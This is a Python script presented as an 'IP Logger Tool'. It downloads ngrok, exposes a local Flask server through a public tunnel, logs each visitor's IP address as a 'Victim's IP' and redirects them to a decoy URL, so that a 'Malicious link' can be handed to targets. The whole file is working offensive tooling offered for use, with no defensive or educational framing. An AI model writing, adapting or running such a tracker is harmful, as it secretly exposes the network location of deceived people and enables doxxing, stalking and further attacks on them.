################################
##                            ##
##    Created by: MomboteQ    ##
##                            ##
################################

# MODULES
from sys import argv
from getopt import getopt, GetoptError

from colorama import Fore, Style, init
from textwrap import dedent

import os
from os import name as system_name
from os import system, chdir
from subprocess import call, Popen, DEVNULL

import sys
import platform
from requests import get
from zipfile import ZipFile
from time import sleep
from json import loads

from flask import Flask, redirect, request
from logging import getLogger, ERROR
import flask.cli

# VARIABLES
PORT = '8080'

# FUNCTIONS
def logo():
    print('''
                    ██┐██████┐ 
                    ██│██┌──██┐
                    ██│██████┌┘
                    ██│██┌───┘ 
                    ██│██│     
                    └─┘└─┘     '''.replace('█', f'{Fore.LIGHTWHITE_EX}█{Fore.LIGHTGREEN_EX}'))
    print(dedent(f'''
    ██┐      ██████┐  ██████┐  ██████┐ ███████┐██████┐ 
    ██│     ██┌───██┐██┌────┘ ██┌────┘ ██┌────┘██┌──██┐
    ██│     ██│   ██│██│  ███┐██│  ███┐█████┐  ██████┌┘
    ██│     ██│   ██│██│   ██│██│   ██│██┌──┘  ██┌──██┐
    ███████┐└██████┌┘└██████┌┘└██████┌┘███████┐██│  ██│
    └──────┘ └─────┘  └─────┘  └─────┘ └──────┘└─┘  └─┘
    {Fore.LIGHTGREEN_EX}┌─────────────────────────────────────────────────┐
    {Fore.LIGHTGREEN_EX}│                 {Fore.LIGHTWHITE_EX}IP Logger Tool                  {Fore.LIGHTGREEN_EX}│
    {Fore.LIGHTGREEN_EX}└─────────────────────────────────────────────────┘
    {Fore.LIGHTGREEN_EX}┌───────────────────────┐ ┌───────────────────────┐
    {Fore.LIGHTGREEN_EX}│ {Fore.LIGHTBLUE_EX}Created by: {Fore.LIGHTWHITE_EX}@MomboteQ{Fore.LIGHTGREEN_EX} │ {Fore.LIGHTGREEN_EX}│     {Fore.LIGHTYELLOW_EX}Version: {Fore.LIGHTWHITE_EX}1.0{Fore.LIGHTGREEN_EX}      │
    {Fore.LIGHTGREEN_EX}└───────────────────────┘ └───────────────────────┘
    {Fore.LIGHTGREEN_EX}┌─────────────────────────────────────────────────┐
    {Fore.LIGHTGREEN_EX}│           {Fore.LIGHTWHITE_EX}https://MomboteQ.github.io            {Fore.LIGHTGREEN_EX}│
    {Fore.LIGHTGREEN_EX}└─────────────────────────────────────────────────┘{Style.RESET_ALL}
    '''.replace('█', f'{Fore.LIGHTWHITE_EX}█{Fore.LIGHTGREEN_EX}')))

def help():
    logo()

    print(Fore.LIGHTWHITE_EX + dedent('''
    Usage: IP-Logger.py [-h] [-t TOKEN] [-u URL]

    Arguments:
      -h, --help                  Show this help
                                  message and exit.
      -t TOKEN, --token TOKEN     Ngrok token.
      -u URL, --url URL           Redirection URL.
    '''))

def clear():
    system('cls' if system_name == 'nt' else 'clear')

def main(argv):
    token = None
    url = None

    try:
        opts, args = getopt(argv, 'ht:u:', ['help', 'token =', 'url ='])
    
    except GetoptError as e:
        logo()
        print(f'\n{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}✗{Fore.LIGHTWHITE_EX}] {str(e).capitalize()}\n')
        return

    helpBool = True
    
    for opt, arg in opts:
        if opt in ('-h', '--help'):
            help()
            return

        if opt in ('-t', '--token'):
            token = arg
            helpBool = False
        
        if opt in ('-u', '--url'):
            url = arg
            helpBool = False
    
    if helpBool:
        help()
        return

    if token == None or url == None:
        print(f'\n{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}✗{Fore.LIGHTWHITE_EX}] Enter token and URL!\n')
        return

    else:
        if 'http://' in url or 'https://' in url:
            pass

        else:
            print(f'\n{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}✗{Fore.LIGHTWHITE_EX}] Enter valid URL!\n')
            return

        download_ngrok()

        run_ngrok(token)

        run_logger(url)
        return

def download_ngrok():
    if os.path.exists('ngrok') or os.path.exists('ngrok.exe'):
        return
    
    print(f'\n[{Fore.LIGHTGREEN_EX}✓{Style.RESET_ALL}] Downloading ngrok...')

    platforms = {
        'darwin_x86_64': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip',
        'darwin_x86_64_arm': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip',
        'windows_x86_64': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip',
        'windows_i386': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-386.zip',
        'linux_x86_64_arm': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz',
        'linux_i386_arm': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz',
        'linux_i386': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz',
        'linux_x86_64': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz',
        'freebsd_x86_64': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-freebsd-amd64.tgz',
        'freebsd_i386': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-freebsd-386.tgz',
        'cygwin_x86_64': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip',
    }

    arch = 'x86_64' if sys.maxsize > 2 ** 32 else 'i386'
    if platform.uname()[4].startswith('arm') or platform.uname()[4].startswith('aarch64'):
        arch += '_arm'

    syst = platform.system().lower()
    if 'cygwin' in syst:
        syst = 'cygwin'

    plat = syst + '_' + arch

    try:
        url = platforms[plat]

        ext = 'zip' if '.zip' in url else 'tgz'
        r = get(url)

        open('ngrok.' + ext, 'wb').write(r.content)

        if ext == 'zip':
            with ZipFile('ngrok.zip', 'r') as zip:
                zip.extractall(chdir(os.path.dirname(__file__)))

        else:
            call(['tar', 'zxvf', 'ngrok.tgz'], stdout = DEVNULL, stderr = DEVNULL)

        if syst == 'windows' or syst == 'cygwin':
            return

        system('chmod +x ngrok')

    except KeyError as e:
        print(f'[{Fore.LIGHTRED_EX}✗{Style.RESET_ALL}] Unsupported platform!')
        quit()

def run_ngrok(token):
    syst = platform.system().lower()
    if 'cygwin' in syst:
        syst = 'cygwin'

    if syst == 'windows' or syst == 'cygwin':
        call(['ngrok.exe', 'config', 'add-authtoken', token], stdout = DEVNULL, stderr = DEVNULL)
        Popen(['ngrok.exe', 'http', PORT], stdout = DEVNULL, stderr = DEVNULL)

    else:
        call(['./ngrok', 'config', 'add-authtoken', token], stdout = DEVNULL, stderr = DEVNULL)
        Popen(['./ngrok', 'http', PORT], stdout = DEVNULL, stderr = DEVNULL)

def run_logger(urlToRedirect):
    app = Flask(__name__)

    flask.cli.show_server_banner = lambda *args: None
    log = getLogger('werkzeug')
    log.setLevel(ERROR)

    @app.route('/', methods = ['GET'])
    def logger_page():
        ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        print(f'[{Fore.LIGHTGREEN_EX}✓{Style.RESET_ALL}] Victim\'s IP : {Fore.LIGHTBLUE_EX + ip + Style.RESET_ALL}')
        return redirect(urlToRedirect)

    sleep(2)

    r = get('http://localhost:4040/api/tunnels')
    url = loads(r.text)['tunnels'][0]['public_url']

    print(f'\n[{Fore.LIGHTGREEN_EX}✓{Style.RESET_ALL}] Malicious link : {Fore.LIGHTBLUE_EX + url + Style.RESET_ALL}')
    print(f'[{Fore.LIGHTGREEN_EX}✓{Style.RESET_ALL}] Waiting for a Victim...\n')

    app.run(port = PORT)


if __name__ == '__main__':
    init()

    clear()
    logo()

    main(argv[1:])